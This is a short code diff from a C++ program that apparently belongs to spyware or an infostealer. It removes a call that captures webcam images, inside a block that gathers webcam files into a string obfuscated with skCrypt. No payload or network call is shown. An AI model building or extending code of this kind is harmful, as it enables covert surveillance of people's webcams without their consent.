@@ -172,7 +172,6 @@ int main(int argc, char* argv[]) {
     // photos content
     string webcams = (string)skCrypt("");
 #if TAKE_WEBCAMS
-    TakeWebcams();
     for (string file : GetWebcams())
         webcams += file + "\n";
 #endif
